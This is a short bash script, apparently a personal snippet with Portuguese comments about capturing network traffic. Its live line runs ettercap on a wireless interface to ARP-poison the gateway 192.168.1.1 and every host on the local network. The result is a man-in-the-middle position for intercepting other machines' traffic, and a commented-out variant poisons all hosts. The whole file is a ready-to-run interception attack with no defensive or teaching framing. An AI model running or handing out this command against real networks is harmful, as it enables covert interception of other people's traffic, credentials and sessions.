#!/bin/bash
#todo trafego(entre maquinas e gateway)
#ettercap -Tq -i wlan0 -M arp /// ///;

#trafego rede 
ettercap -Tq -i wlan0 -M arp:remote /192.168.1.1// ///;
